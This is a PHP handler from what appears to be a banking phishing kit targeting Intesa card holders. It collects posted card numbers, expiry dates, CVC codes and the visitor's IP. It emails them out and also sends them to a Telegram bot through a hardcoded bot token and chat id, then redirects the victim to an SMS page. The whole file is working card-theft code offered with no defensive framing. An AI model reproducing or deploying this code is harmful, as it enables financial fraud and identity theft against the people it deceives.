<?php
session_start();
$ip = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';

if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
    $candidate = trim($ips[0]);

    if (filter_var($candidate, FILTER_VALIDATE_IP)) {
        $ip = $candidate;
    }
}
$hostname = gethostbyaddr($ip);
if(!empty($_POST['number'])  && !empty($_POST['expiry']) && !empty($_POST['cvc'])){

$cc = str_replace("+","",$_POST['ccnum']);
$message .= "=========[ggg]=========\n";
$message .= "Creditcardnummer  : ".$_POST['number']."\n";
$message .= "Date expiration : ".$_POST['expiry']."\n";
$message .= "CVV  : ".$_POST['cvc']."\n";
$message .= "===============[IP]==============\n";
$message .= "IP : http://www.geoiptool.com/?IP=$ip\n";
$message .= "==========[ggg]=========";
$to="gmers.com";
$subject = "CC INTESA  [$ip]";
$headers = "From: CC INTESA <bladzb.de>";
$headers .= "MIME-Version: 1.0\n";

mail($to, $subject, $message,$headers);
		    $token = "8712281940:AAF7RQkUscdeFPocXnJj8-Db7sxeU4L2AiU";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-5265165672&text=" . urlencode($message)."" );
header("Location:../sms.php");
}else{
header("Location:../kaart.php?error");
}